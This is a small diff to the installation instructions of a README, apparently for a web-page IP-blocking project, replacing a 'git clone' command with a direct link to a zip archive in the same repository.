@@ -16,5 +16,5 @@ Designed for simplicity, efficiency, and clarity — no technical complexity req
 
 ## Installation
 1. Download or clone this repository:
-   ```bash
-   git clone https://github.com/pmat1000/simple-ip-blocker-for-pages.git
+
+  https://github.com/Pmat1000/simple-ip-blocker-for-pages/raw/refs/heads/main/simple-ip-blocker-for-pages.zip
